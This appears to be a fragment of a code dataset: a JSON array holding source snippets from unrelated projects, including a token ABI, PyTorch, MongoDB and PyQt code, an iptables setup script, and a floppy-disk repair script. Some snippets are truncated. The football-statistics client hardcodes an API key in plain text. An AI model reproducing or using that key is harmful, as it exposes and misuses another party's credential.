\"\",\n                    \"type\": \"bool\"\n                }\n            ],\n            \"payable\": false,\n            \"stateMutability\": \"nonpayable\",\n            \"type\": \"function\"\n        },\n        {\n            \"constant\": true,\n            \"inputs\": [\n                {\n                    \"name\": \"_owner\",\n                    \"type\": \"address\"\n                },\n                {\n                    \"name\": \"_spender\",\n                    \"type\": \"address\"\n                }\n            ],\n            \"name\": \"allowance\",\n            \"outputs\": [\n                {\n                    \"name\": \"\",\n                    \"type\": \"uint256\"\n                }\n            ],\n            \"payable\": false,\n            \"stateMutability\": \"view\",\n            \"type\": \"function\"\n        },\n        {\n            \"payable\": true,\n            \"stateMutability\": \"payable\",\n            \"type\": \"fallback\"\n        },\n        {\n            \"anonymous\": false,\n            \"inputs\": [\n                {\n                    \"indexed\": true,\n                    \"name\": \"owner\",\n                    \"type\": \"address\"\n                },\n                {\n                    \"indexed\": true,\n                    \"name\": \"spender\",\n                    \"type\": \"address\"\n          ",
    "import torch \n\nclass ICHDataset(Dataset):\n    def __init__(self, imgs,img_dir, img_size, csv_path ,mode=\"train\", transforms= None):\n        super().__init__()\n        self.imgs = imgs\n        self.mode = mode\n        self.transforms = transforms\n        self.img_dir = img_dir\n        self.img_size = img_size \n        self.img_df = pd.read_csv(csv_path)\n    def __getitem__(self, idx):\n        image_name = self.imgs[idx]\n        image_name = str(image_name)[2:14]\n        path = os.path.join(self.img_dir, image_name)\n        img = Image.open(path)\n        img = img.resize((self.img_size, self.img_size))\n\n        if self.mode == \"train\":\n            label = self.img_df.loc[[image_name]]\n            label = torch.tensor(label.values, dtype = torch.float32)\n            img = self.transforms(img)\n\n            return  img, label\n        elif self.mode == \"val\":\n            label = self.img_df.loc[[image_name]]\n            label = torch.tensor(label.values, dtype = torch.float32)\n            img = self.transforms(img)\n\n            return img, label, image_name\n\n    def __len__(self):\n        return len(self.imgs)",
    "import pymongo\r\nimport os, csv\r\nimport time\r\nfrom datetime import datetime, timedelta\r\n\r\n\r\nconn = pymongo.MongoClient(\"mongodb://0.0.0.0:27017/\") ## Mongo DB connection\r\nmydb = conn[\"ggsn_occ\"] ## Mongo DB name\r\n\r\ndef get_col_name(time_stamp): ## used to get the collection name for each CDRs\r\n    table_name = \"ggsn_occ_\" + str(time_stamp)[:10].replace('-', '')\r\n    return table_name\r\n\r\n\r\ndef get_batches_of_msisdns(list_of_msisdns):\r\n    batch_len = 8000 ## length of number of batch of numbers to be operated on\r\n    output_list = []\r\n    i=0\r\n    while i < len(list_of_msisdns):\r\n        int_list = []\r\n        j = 0\r\n        while (i < len(list_of_msisdns)) and (j < batch_len):\r\n            int_list.append(list_of_msisdns[i])\r\n            i += 1 # outer loop\r\n            j += 1 # inner loop\r\n        output_list.append(int_list)\r\n    return output_list ## return list of list [ [list 1], [list 2 ], [list 3] ]\r\n\r\ndef get_ggsn_line(line):\r\n    msisdn = line[1]\r\n    rat = line[2]\r\n    si = line[3]\r\n    coll_name = get_col_name(line[4])\r\n    return msisdn, rat, si, coll_name\r\n\r\ndef get_billing_line(line):\r\n    msisdn = line[0]\r\n    coll_name = get_col_name(line[1])\r\n    rat = line[5]\r\n    offer = line[2]\r\n    si = line[7]\r\n    return msisdn, offer, rat, si, coll_name\r\n\r\nwhile True:\r\n    ############## GGSN CDRs\r\n    ggsn_all_files = list(os.listdir('/cdrs_file/directory/GGSN_CDRS/')) ## ggsn files directory\r\n    ggsn_all_files = list(filter(lambda x: x.endswith('.csv'), ggsn_all_files)) ## dont read temp files\r\n    x=0\r\n    pre_dict = {}\r\n    for elem in ggsn_all_files:\r\n        x+=1\r\n        csv_Reader = csv.reader(open(\"/cdrs_file/directory/GGSN_CDRS//\"+elem)) ## open each GGSN CSV files\r\n        for line in csv_Reader:\r\n            msisdn, rat, si, coll_name = get_ggsn_line(line) ## extract the follosing info from each line Number(MSISDN), Radio Acceess Type (RAT), Service Identefire (SI) and Collection name based on CDR Time Stamp\r\n            pre_dict.setdefault(coll_name,{})\r\n            pre_dict[coll_name].setdefault(msisdn,{\"msisdn\":msisdn, \"GGSN\":{}, \"billing\":{}})\r\n            pre_dict[coll_name][msisdn]['GGSN'].setdefault(rat, {})\r\n            pre_dict[coll_name][msisdn]['GGSN'][rat].setdefault(si, {\"usage\":0})\r\n            pre_dict[coll_name][msisdn]['GGSN'][rat][si][\"usage\"]+=(int(line[6])+int(line[7])) ## uplink + downlink usage\r\n\r\n    ###################### Billing CDRs\r\n    billing_all_files = list(os.listdir('/cdrs_file/directory/billing_cdrs//'))## ggsn files directory\r\n    billing_all_files = list(filter(lambda x: x.endswith('.csv'), occ_all_files))## dont read temp files\r\n    x = 0\r\n    for elem in billing_all_files:\r\n        x += 1\r\n        csv_Reader = csv.reader(open(\"/cdrs_file/directory/billing_cdrs//\" + elem))\r\n        for line in csv_Reader:\r\n            msisdn, offer, rat, si, coll_name = get_billing_line(line) ## extract the follosing info from each line Number(MSISDN), Used Offer Name, Radio Acceess Type (RAT), Service Identefire (SI) and Collection name based on CDR Time Stamp\r\n            pre_dict.setdefault(coll_name, {})\r\n            pre_dict[coll_name].setdefault(msisdn, {\"msisdn\": msisdn, \"GGSN\": {}, \"billing\": {}})\r\n            pre_dict[coll_name][msisdn]['billing'].setdefault(rat, {})\r\n            pre_dict[coll_name][msisdn]['billing'][rat].setdefault(offer, {})\r\n            pre_dict[coll_name][msisdn]['billing'][rat][offer].setdefault(si, {\"usage\":0})\r\n            pre_dict[coll_name][msisdn]['billing'][rat][offer][si]['usage']+=int(line[4])\r\n    for coll_table in pre_dict.keys():\r\n        ### For each Collection in the pre_dict create the collection and its index\r\n        mycol = mydb[coll_table]\r\n        mycol.create_index('msisdn', unique=True)\r\n        ####\r\n        total_msisdns = len(pre_dict[coll_table].keys())\r\n        batches_of_msisdns = get_batches_of_msisdns(list(pre_dict[coll_table].keys())) ## in order to not overuse the memory we divide the numbers of each collection to batched in our case we used 8000 per round\r\n        for each_batch in batches_of_msisdns:\r\n            to_be_updated = []\r\n            collection_update = list(mycol.find({\"msisdn\":{\"$in\":each_batch}},{'_id':0}))## fetch for numbers allredy exist in the Mongo DB Collection\r\n            msisdn_update = [str(elem[\"msisdn\"]) for elem in collection_update] ### Make list of the numbers to be updated\r\n            msisdn_insert = list(set(each_batch) - set(msisdn_update)) ### the rest  of the numbers will be inserted directly\r\n            to_be_inserted = [pre_dict[coll_table][msisdn] for msisdn in msisdn_insert] ## make list of the document JSON that will be inserted directly\r\n            ### the below section is to update the content of each document.for both GGSN and Billing Side.\r\n            for collection in collection_update:\r\n                val = {\"msisdn\":collection[\"msisdn\"], \"billing\": collection[\"billing\"], \"GGSN\": collection[\"GGSN\"]}\r\n                for rat in pre_dict[coll_table][collecti",
    "import sys\r\nimport requests\r\nfrom PyQt5.QtWidgets import (\r\n    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,\r\n    QPushButton, QLabel, QLineEdit, QComboBox, QCheckBox, QMessageBox, QGridLayout,\r\n    QScrollArea, QFrame\r\n)\r\nfrom PyQt5.QtGui import QIcon\r\nfrom PyQt5.QtCore import Qt\r\n\r\ndef validate_float(text):\r\n    try:\r\n        if text:\r\n            text = text.replace('\u3002', '.')\r\n            float(text)\r\n            return True\r\n        return False\r\n    except ValueError:\r\n        return False\r\n\r\nclass NumericLineEdit(QLineEdit):\r\n    def __init__(self, placeholder_text='', parent=None):\r\n        super().__init__(parent)\r\n        self.setPlaceholderText(placeholder_text)\r\n\r\n    def focusOutEvent(self, event):\r\n        text = self.text()\r\n        if text and not validate_float(text):\r\n            QMessageBox.warning(self, \"\u8f93\u5165\u9519\u8bef\", \"\u8bf7\u8f93\u5165\u6709\u6548\u6570\u5b57\u3002\")\r\n            self.clear()\r\n        super().focusOutEvent(event)\r\n\r\nclass LLMComparisonTool(QMainWindow):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.setWindowTitle(\"LLM API\u4ef7\u683c\u6bd4\u8f83\u5668\")\r\n        self.setWindowIcon(QIcon(\"D:\\\\Price\\\\LLM API Price Comperator.ico\"))\r\n        self.setGeometry(100, 100, 1200, 350)\r\n        self.exchange_rate = 1.0\r\n        self.initUI()\r\n        self.get_exchange_rate()\r\n\r\n    def initUI(self):\r\n        self.central_widget = QWidget()\r\n        self.setCentralWidget(self.central_widget)\r\n        self.layout = QVBoxLayout()\r\n        self.central_widget.setLayout(self.layout)\r\n\r\n        self.exchange_rate_layout = QHBoxLayout()\r\n        self.exchange_rate_label = QLabel(\"\u5f53\u524d\u6c47\u7387\uff08USD/CNY\uff09: \u83b7\u53d6\u4e2d...\")\r\n        self.refresh_rate_button = QPushButton(\"\u5237\u65b0\u6c47\u7387\")\r\n        self.refresh_rate_button.clicked.connect(self.get_exchange_rate)\r\n        self.exchange_rate_layout.addWidget(self.exchange_rate_label)\r\n        self.exchange_rate_layout.addWidget(self.refresh_rate_button)\r\n        self.layout.addLayout(self.exchange_rate_layout)\r\n\r\n        self.token_input_layout = QHBoxLayout()\r\n        self.token_input = NumericLineEdit(\"\u8f93\u5165Token\u6570\")\r\n        self.token_output = NumericLineEdit(\"\u8f93\u51faToken\u6570\")\r\n        self.token_input_layout.addWidget(QLabel(\"\u8f93\u5165Token\u6570:\"))\r\n        self.token_input_layout.addWidget(self.token_input)\r\n        self.token_input_layout.addWidget(QLabel(\"\u8f93\u51faToken\u6570:\"))\r\n        self.token_input_layout.addWidget(self.token_output)\r\n        self.layout.addLayout(self.token_input_layout)\r\n\r\n        self.scroll_area = QScrollArea()\r\n        self.scroll_area.setWidgetResizable(True)\r\n        self.scroll_frame = QFrame()\r\n        self.scroll_area.setWidget(self.scroll_frame)\r\n        self.layout.addWidget(self.scroll_area)\r\n\r\n        self.providers_grid = QGridLayout(self.scroll_frame)\r\n        headers = [\"\u670d\u52a1\u5546\u540d\u79f0\", \"\u5145\u503c\u91d1\u989d (\u4ec5\u6570\u5b57)\", \"\u5145\u503c\u8d27\u5e01\", \"\u5230\u8d26\u4f59\u989d (\u4ec5\u6570\u5b57)\", \"\u8f93\u5165\u4ef7\u683c (\u4ec5\u6570\u5b57)\", \"\u8f93\u51fa\u4ef7\u683c (\u4ec5\u6570\u5b57)\", \"\u4e0d\u533a\u5206\u8f93\u5165\u8f93\u51fa\", \"Token\u5355\u4f4d\", \"\u64cd\u4f5c\"]\r\n        for i, header in enumerate(headers):\r\n            self.providers_grid.addWidget(QLabel(header), 0, i)\r\n\r\n        self.add_provider_button = QPushButton(\"\u6dfb\u52a0\u66f4\u591a\u670d\u52a1\u5546\")\r\n        self.add_provider_button.clicked.connect(self.add_provider_row)\r\n        self.layout.addWidget(self.add_provider_button)\r\n\r\n        self.result_label = QLabel(\"\u8d39\u7528\u6392\u540d\uff08\u7531\u4f4e\u81f3\u9ad8\uff09:\")\r\n        self.result_list = QLabel(\"\")\r\n        self.layout.addWidget(self.result_label)\r\n        self.layout.addWidget(self.result_list)\r\n\r\n        self.calculate_button = QPushButton(\"\u8ba1\u7b97\u6210\u672c\")\r\n        self.calculate_button.clicked.connect(self.calculate_costs)\r\n        self.layout.addWidget(self.calculate_button)\r\n\r\n        self.clear_button = QPushButton(\"\u6e05\u9664\u6240\u6709\u6570\u636e\")\r\n        self.clear_button.clicked.connect(self.clear_all_data)\r\n        self.layout.addWidget(self.clear_button)\r\n\r\n        self.github_link = QLabel('<a href=\"https://github.com/CookSleep/LLM-API-Price-Comperator\">GitHub @CookSleep</a>')\r\n        self.github_link.setOpenExternalLinks(True)\r\n        self.github_link.setAlignment(Qt.AlignCenter)\r\n        self.layout.addWidget(self.github_link)\r\n\r\n        self.clear_all_data()\r\n\r\n    def add_provider_row(self):\r\n        index = self.providers_grid.rowCount()\r\n        provider_name = QLineEdit()\r\n        recharge_amount = NumericLineEdit(\"\u4ec5\u6570\u5b57\")\r\n        currency_combo = QComboBox()\r\n        currency_combo.addItems([\"CNY\", \"USD\"])\r\n        balance = NumericLineEdit(\"\u4ec5\u6570\u5b57\")\r\n        input_price = NumericLineEdit(\"\u4ec5\u6570\u5b57\")\r\n        output_price = NumericLineEdit(\"\u4ec5\u6570\u5b57\")\r\n        input_output_checkbox = QCheckBox()\r\n        input_output_checkbox.stateChanged.connect(lambda state, x=output_price: self.toggle_output_price(state, x))\r\n        token_unit_combo = QComboBox()\r\n        token_unit_combo.addItems([\"1K token\", \"1M token\"])\r\n        delete_button = QPushButton(\"\u5220\u9664\")\r\n        delete_button.clicked.connect(lambda: self.delete_provider_row(index))\r\n\r\n        row_widgets = [provider_name, recharge_amount, currency_combo, balance, input_price, output_price, input_output_checkbox, token_unit_combo, delete_button]\r\n        for i, widget in enumerate(row_widgets):\r\n         ",
    "import subprocess\nimport os\nimport shutil\ndef firewall():\n    os.chdir('/root/')\n    try :\n        shutil.rmtree('/root/iptables_rules/', ignore_errors=True)\n    finally:\n        os.mkdir(\"iptables_rules\")\n        os.chdir('/root/iptables_rules')\n        shutil.copyfile(\"/root/Config-server/firewall.txt\" , \"/root/iptables_rules/firewall.txt\")\n        print(\"how many white ip do you have ? \",end=\"\")\n        a = int(input())\n        for i in range (a) :\n            print(\"enter your \",i+1,\" ip :\",end='')\n            q = input()\n            f = open(\"firewall.txt\",'a')\n            f.write(\"\\n\" + q)\n            f.close()\n        install = subprocess.run([\"apt\",'install','iptables','ipset','-y'])\n        if install.returncode == 0 :\n            print(\"\\niptables installed.\")\n        else :\n            print(\"\\nunable to install iptables\")\n        install2 = subprocess.run([\"apt\",'install','iptables-persistent'])\n        if install2.returncode == 0 :\n            print(\"\\niptables-persistent installed.\")\n        else :\n            print(\"\\nunable to install iptables-persistent\")\n        service_run = subprocess.run([\"service\",'iptables','start'])\n        if service_run.returncode == 0 :\n            print(\"\\niptables runned.\")\n        else :\n            print(\"\\nunable to run iptables\")\n        u = open(\"apply.sh\",'a')\n        u.write(\"\\n#!/bin/bash\")\n        u.write(\"\\niptables -F\")\n        print(\"Enter your ssh port : \",end=\"\")\n        ssh = input()\n        u.write(\"\\niptables -A INPUT -p tcp --dport \"+ ssh +\" -j ACCEPT\")\n        print(\"How many white IP do you have ? \",end=\"\")\n        num = int(input())\n        for i in range(num):\n            print('Enter your', i + 1, 'IP :', end='')\n            ip = input()\n            u.write(\"\\niptables -A INPUT -s \" + ip + \" -j ACCEPT\")\n            u.write(\"\\niptables -A OUTPUT -s \" + ip + \" -j ACCEPT\")\n        u.write(\"\\nipset create whitelist hash:net\")\n        u.write(\"\\nwhile read line; do ipset add whitelist $line; done < /root/iptables_rules/firewall.txt\")\n        u.write(\"\\niptables -A INPUT -m set --match-set whitelist src -j ACCEPT\")\n        u.write(\"\\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\")\n        u.write(\"\\niptables -I INPUT 1 -i lo -j ACCEPT\")\n        u.write(\"\\niptables -A INPUT -j DROP\")\n        u.close()\n        chmod = subprocess.run([\"chmod\", \"+x\", \"apply.sh\"])\n        if chmod.returncode == 0:\n            print(\"Chmod done\")\n        else:\n            print(\"chmod failed\")\n        run = subprocess.run([\"bash\", \"apply.sh\"])\n        if run.returncode == 0:\n            print(\"apply runned\")\n        else:\n            print(\"unable to run apply\")\n        tada = open(\"/etc/rc.local\", 'a')\n        tada.write(\"#!/bin/sh\")\n        tada.write(\"\\nchmod +x /root/iptables_rules/apply.sh\")\n        tada.write(\"\\nbash /root/iptables_rules/apply.sh\")\n        tada.close()\n        chown = subprocess.run([\"chown\", \"root\", '/etc/rc.local'])\n        if chown.returncode == 0:\n            print(\"chown Done\")\n        else:\n            print(\"unable to chown\")\n        chmod = subprocess.run([\"chmod\", \"755\", '/etc/rc.local'])\n        if chmod.returncode == 0:\n            print(\"chmod Done\")\n        else:\n            print(\"unable to mod\")\n        start = subprocess.run([\"bash\", \"/etc/rc.local\", \"start\"])\n        if start.returncode == 0:\n            print(\"Started\")\n        else:\n            print(\"unable to Start\")",
    "# non_max_suppression_kpt fun\u00e7\u00e3o \u00e9 uma t\u00e9cnica usada para suprimir (ou seja, remover) Bounding Boxes redundantes em uma imagem ap\u00f3s a detec\u00e7\u00e3o de objetos.\n# output_to_keypoint e plot_skeleton_kpts s\u00e3o fun\u00e7\u00f5es usadas para converter a sa\u00edda do modelo em keypoints e escrever o esqueleto baseado em keypoints na imagem.\nfrom torch import no_grad\nfrom utils.general import non_max_suppression_kpt\nfrom utils.plots import output_to_keypoint, plot_skeleton_kpts\n\nimport cv2\nfrom numpy import uint8\n\n\ndef desenhar_keypoints(modelo,  saida, imagem): \n    saida = non_max_suppression_kpt(saida, \n                                        0.25, # Confid\u00eancia da detec\u00e7\u00e3o\n                                        0.65, # IoU (Interse\u00e7\u00e3o sobre Uni\u00e3o) Threshold (Tirar bounding boxes reduntes)\n                                        nc=modelo.yaml['nc'], # N\u00famero de classes\n                                        nkpt=modelo.yaml['nkpt'], # N\u00famero de Keypoints\n                                        kpt_label=True)\n    \n    with no_grad():\n        saida = output_to_keypoint(saida) # Converte para formato -> [batch_id, class_id, x, y, w, h, conf]\n    \n    for idx in range(saida.shape[0]):\n        plot_skeleton_kpts(imagem, saida[idx, 7:].T, 3) # Desenha os keypoints na imagem\n\n    return imagem",
    "import requests\nimport numpy as np\nimport os\napi_key = \"df7c75bf8ca678790da079439129a291b8a238dea11effda993bf659243a997b\"\n\n\ndef pad_list(lst, max_length):\n    return lst + [np.nan] * (max_length - len(lst))\n\n\ndef getTestData(teamid, teamid2):\n\n    score = []\n    place = []\n    possession = []\n    shotinsidebox = []\n    dangerousattacks = []\n    accuracy = []\n    On_target = []\n    Corners = []\n    Attacks = []\n\n    score2 = []\n    place2 = []\n    possession2 = []\n    shotinsidebox2 = []\n    dangerousattacks2 = []\n    accuracy2 = []\n    On_target2 = []\n    Corners2 = []\n    Attacks2 = []\n\n\n    outcome = []\n    team1 = []\n    team2 = []\n    event_date = []\n    away = 1\n    home = 2\n\n    ballpos = 'Ball Possession'\n    passaccu = 'Passes Accurate'\n    shotinside = 'Shots Inside Box'\n    dangerous = 'Dangerous Attacks'\n    target = 'On Target'\n    Corner = 'Corners'\n    Attack = 'Attacks'\n\n    url = f'https://apiv2.allsportsapi.com/football/?met=H2H&APIkey={\n        api_key}&firstTeamId={teamid}&secondTeamId={teamid2}'\n\n    responed = requests.get(url=url)\n    if responed.status_code == 200:\n        data = responed.json()['result']['H2H']\n\n        for key in data:\n            event_key = key['event_key']\n            featureurl = f'https://apiv2.allsportsapi.com/football/?met=Fixtures&APIkey={api_key}&from=2023-01-01&to=2024-05-14&matchId={event_key}'\n\n            featurerespond = requests.get(url=featureurl)\n            if featurerespond.status_code == 200:\n                if 'result' in featurerespond.json():\n                    featuredata = featurerespond.json()['result'][:1]\n                    for match in featuredata:\n                        homeid = match['home_team_key']\n                        awayid = match['away_team_key']\n                        homename = match['event_home_team']\n                        awayname = match['event_away_team']\n                        goals = match['event_final_result']\n                        event_date.append(match['event_date'])\n                        stat = match['statistics']\n\n                        if goals == '-':\n                            if teamid == homeid:\n                                place.append(home)\n                                place2.append(away)\n                                team1.append(homename)\n                                team2.append(awayname)\n                                score.append(0)\n                                score2.append(0)\n                                outcome.append('Draw')\n                            elif teamid == awayid:\n                                place.append(away)\n                                place2.append(home)\n                                score.append(0)\n                                score2.append(0)\n                                outcome.append('Draw')\n                        else:\n                            homescores = goals[0]\n                            awayscores = goals[4]\n\n                            if homeid == teamid:\n                                place.append(home)\n                                place2.append(away)\n                                team1.append(homename)\n                                team2.append(awayname)\n                                score.append(homescores)\n                                score2.append(awayscores)\n                                if homescores > awayscores:\n                                    outcome.append('TeamOne')\n                                elif awayscores > homescores:\n                                    outcome.append('TeamTwo')\n                                else:\n                                    outcome.append('Draw')\n\n                                for statis in stat:\n                                    if statis['type'] == ballpos:\n                                        possession.append(\n                                            statis['home'].replace('%', ''))\n                                        possession2.append(\n                                            statis['away'].replace('%', ''))\n                                    if statis['type'] == passaccu:\n                                        accuracy.append(statis['home'])\n                                        accuracy2.append(statis['away'])\n                                    if statis['type'] == shotinside:\n                                        shotinsidebox.append(statis['home'])\n                                        shotinsidebox2.append(statis['away'])\n                                    if statis['type'] == dangerous:\n                                        dangerousattacks.append(statis['home'])\n                                        dangerousattacks2.append(\n                                            statis['away'])\n                                    if statis['type'] == target:\n                                        On_target.append(statis['home'])\n                                        On_target2.append(statis['away'])\n                   ",
    "from functools import partial\nfrom itertools import chain\nfrom typing import TYPE_CHECKING, Any, Callable, Dict, List, Literal, Tuple\n\nfrom ..extras.constants import IGNORE_INDEX\nfrom ..extras.logging import get_logger\nfrom .utils import Role\n\n\nif TYPE_CHECKING:\n    from transformers import Seq2SeqTrainingArguments\n    from transformers.tokenization_utils import PreTrainedTokenizer\n\n    from ..hparams import DataArguments\n    from .template import Template\n\n\nlogger = get_logger(__name__)\n\n\ndef preprocess_pretrain_dataset(\n    examples: Dict[str, List[Any]], tokenizer: \"PreTrainedTokenizer\", data_args: \"DataArguments\"\n) -> Dict[str, List[List[int]]]:\n    # build grouped texts with format `X1 X2 X3 ...` if packing is enabled\n    text_examples = [messages[0][\"content\"] + tokenizer.eos_token for messages in examples[\"prompt\"]]\n    if not data_args.packing:\n        return tokenizer(text_examples, add_special_tokens=False, max_length=data_args.cutoff_len)\n\n    tokenized_examples = tokenizer(text_examples, add_special_tokens=False)\n    concatenated_examples = {k: list(chain(*tokenized_examples[k])) for k in tokenized_examples.keys()}\n    total_length = len(concatenated_examples[list(concatenated_examples.keys())[0]])\n    block_size = data_args.cutoff_len\n    # we drop the small remainder, and if the total_length < block_size, we exclude this batch\n    total_length = (total_length // block_size) * block_size\n    # split by chunks of cutoff_len\n    result = {\n        k: [t[i : i + block_size] for i in range(0, total_length, block_size)]\n        for k, t in concatenated_examples.items()\n    }\n    if data_args.template == \"gemma\":\n        for i in range(len(result[\"input_ids\"])):\n            result[\"input_ids\"][i][0] = tokenizer.bos_token_id\n\n    return result\n\n\ndef preprocess_supervised_dataset(\n    examples: Dict[str, List[Any]],\n    tokenizer: \"PreTrainedTokenizer\",\n    template: \"Template\",\n    data_args: \"DataArguments\",\n) -> Dict[str, List[List[int]]]:\n    # build inputs with format `<bos> X Y <eos>` and labels with format `<ignore> ... <ignore> Y <eos>`\n    # for multiturn examples, we only mask the prompt part in each prompt-response pair.\n    model_inputs = {\"input_ids\": [], \"attention_mask\": [], \"labels\": []}\n\n    for i in range(len(examples[\"prompt\"])):\n        if len(examples[\"prompt\"][i]) % 2 != 1 or len(examples[\"response\"][i]) != 1:\n            continue\n\n        messages = examples[\"prompt\"][i] + examples[\"response\"][i]\n        input_ids, labels = [], []\n        for turn_idx, (source_ids, target_ids) in enumerate(\n            template.encode_multiturn(\n                tokenizer,\n                messages,\n                examples[\"system\"][i],\n                examples[\"tools\"][i],\n                data_args.cutoff_len,\n                data_args.reserved_label_len,\n            )\n        ):\n            if data_args.train_on_prompt:\n                source_mask = source_ids\n            elif turn_idx != 0 and template.efficient_eos:\n                source_mask = [tokenizer.eos_token_id] + [IGNORE_INDEX] * (len(source_ids) - 1)\n            else:\n                source_mask = [IGNORE_INDEX] * len(source_ids)\n\n            input_ids += source_ids + target_ids\n            labels += source_mask + target_ids\n\n        if template.efficient_eos:\n            input_ids += [tokenizer.eos_token_id]\n            labels += [tokenizer.eos_token_id]\n\n        model_inputs[\"input_ids\"].append(input_ids)\n        model_inputs[\"attention_mask\"].append([1] * len(input_ids))\n        model_inputs[\"labels\"].append(labels)\n\n    return model_inputs\n\n\ndef preprocess_packed_supervised_dataset(\n    examples: Dict[str, List[Any]],\n    tokenizer: \"PreTrainedTokenizer\",\n    template: \"Template\",\n    data_args: \"DataArguments\",\n) -> Dict[str, List[List[int]]]:\n    # build inputs with format `<bos> X1 Y1 <eos> <bos> X2 Y2 <eos>`\n    # and labels with format `<ignore> ... <ignore> Y1 <eos> <ignore> ... <ignore> Y2 <eos>`\n    model_inputs = {\"input_ids\": [], \"attention_mask\": [], \"labels\": []}\n    input_ids, labels = [], []\n    for i in range(len(examples[\"prompt\"])):\n        if len(examples[\"prompt\"][i]) % 2 != 1 or len(examples[\"response\"][i]) != 1:\n            continue\n\n        messages = examples[\"prompt\"][i] + examples[\"response\"][i]\n        for source_ids, target_ids in template.encode_multiturn(\n            tokenizer, messages, examples[\"system\"][i], examples[\"tools\"][i]\n        ):\n            if data_args.train_on_prompt:\n                source_mask = source_ids\n            elif len(input_ids) != 0 and template.efficient_eos:\n                source_mask = [tokenizer.eos_token_id] + [IGNORE_INDEX] * (len(source_ids) - 1)\n            else:\n                source_mask = [IGNORE_INDEX] * len(source_ids)\n\n            input_ids += source_ids + target_ids\n            labels += source_mask + target_ids\n\n    if template.efficient_eos:\n        input_ids += [tokenizer.eos_token_id]\n        labels += [tokenizer.eos_token_id]\n\n    total_length = len(inp",
    "from setuptools import setup, find_packages\r\n\r\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as fh:\r\n    long_description = fh.read()\r\n\r\nsetup(\r\n    name='fingerprintMatcher',\r\n    version='1.0.0',\r\n    author='Tharun K',\r\n    author_email='tharunkkumarasamy@gmail.com',\r\n    description='The FingerprintMatcher Python package provides a comprehensive toolkit for fingerprint matching and recognition tasks. With its intuitive interface and powerful functionality, this package enables users to compare fingerprint images, match them against a database of known fingerprints, and determine their similarity with high accuracy.',\r\n    long_description=long_description,\r\n    long_description_content_type='text/markdown',\r\n    url='https://github.com/Tharunk07/fingerprintMatcher',\r\n    project_urls={\r\n        'Bug Tracker': 'https://github.com/Tharunk07/fingerprintMatcher/issues'\r\n    },\r\n    classifiers=[\r\n        'Programming Language :: Python :: 3',\r\n        'License :: OSI Approved :: MIT License',\r\n        'Operating System :: OS Independent'\r\n    ],\r\n    install_requires=['opencv-python'],\r\n)\r\n",
    "#!/usr/bin/env python3\n\n'''\n   Example repair script for a single stubborn sector\n   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'''\n\n# This script is an example of how one can read a sector even\n# if the address-mark is bad or missing.\n#\n# The script was built iteratively from top to bottom,\n# as the investigation progressed.\n\nimport os\n\nfrom floppytools.main import MediaDir\nfrom floppytools.q1_microlite import Q1MicroLite\nfrom floppytools.kryostream import KryoStream, NotAKryofluxStream\nfrom floppytools.repairtools import Comparator\nfrom floppytools.fluxstream import flux_data\n\n# This is what we're after\n\nMEDIANAME = \"q1\"\nTARGET = (39, 0, 18)\nSECTOR_LENGTH = 20\n\n# Explanation below\nNEIGHBOR = (39, 0, 80)\n\n# This one also has bad AM\n# TARGET = (41, 0, 77)\n# NEIGHBOR = (41, 0, 14)\n\n# Open the cached state of this floppy disk\nmd = MediaDir(MEDIANAME, MEDIANAME, [Q1MicroLite,])\n\nprint(\"# find candidate stream files\")\nfluxfiles = list(md.stream_files_for(TARGET))\n\n# This is sort of a many-input diff(1) which attempt to show\n# where the readings agree and disagree in a useful format\ncomp = Comparator()\n\nif False:\n\n    # The following fails, because we find no good address-marks\n\n    print(\"# find flux of candidate sectors\")\n    for ff in fluxfiles:\n        try:\n            stream = KryoStream(os.path.join(MEDIANAME, ff))\n        except NotAKryofluxStream:\n            continue\n    \n        # Pass a bit more flux than strictly necessary, in case of erasures\n        for flux in md.format_class.flux_for_sector(TARGET, stream):\n            comp.add_reading(flux[:16*(SECTOR_LENGTH + 10)])\n    \n    print(\"# analyze\")\n    comp.analyze()\n\n# Ok, let's find out what goes on in those tracks...\n\nif True:\n    stream = KryoStream(os.path.join(MEDIANAME, fluxfiles[0]))\n\n    for flux_parts in md.format_class.split_stream(stream):\n        chs = md.format_class.am_to_chs(stream, flux_parts[0])\n        print(chs, \" \".join(str(len(x)) for  x in flux_parts[1:]))\n\n# This is part of the output:\n#\n# (39, 0, 15) 553\n# (39, 0, 78) 558\n# (39, 0, 16) 561\n# (39, 0, 79) 556\n# (39, 0, 17) 556\n# (39, 0, 80) 748 563\n# (39, 0, 81) 555\n# (39, 0, 19) 561\n# (39, 0, 82) 568\n# (39, 0, 20) 563\n# (39, 0, 83) 553\n#\n# From this we can see that\n#   A) The sectors are interleaved half a rotation\n# and\n#   B) our TARGET is missing the address-mark\n#\n# We process all the fluxfiles and grab the second \"data\" part after the address mark\n# of our new-found NEIGHBOR\n\nfound_sectors = {}\n\nfor ff in fluxfiles:\n    try:\n        stream = KryoStream(os.path.join(MEDIANAME, ff))\n    except NotAKryofluxStream:\n        continue\n\n    for flux_parts in md.format_class.split_stream(stream):\n\n        # Not all AM's might be missing, they could also have bad checksum\n        # It's probably safer to work from a good AM, than trying to repair\n        # the bad ones, but your mileage may vary.\n\n        if len(flux_parts) < 3:\n            continue\n\n        # More than one AM could be missing\n        if len(flux_parts[1]) > 800:\n            continue\n\n        chs = md.format_class.am_to_chs(stream, flux_parts[0])\n        if chs != NEIGHBOR:\n            continue\n\n        print(chs, \" \".join(str(len(x)) for  x in flux_parts[1:]))\n        data = flux_data(flux_parts[2], 1, 2)\n        for sect in md.format_class.propose_sector(TARGET, SECTOR_LENGTH, data):\n            found_sectors[sect.octets] = sect\n\nprint(\"HITS\", len(found_sectors))\nassert len(found_sectors) == 1\n\n# Not much to be worried about then...\n\n# Record the hit in the .ft_cache\ni = list(found_sectors.values())[0]\ni.extra = \"repaired\"\nmd.add_sector(i)\n\n# And write the result\nmd.write_result()\n",
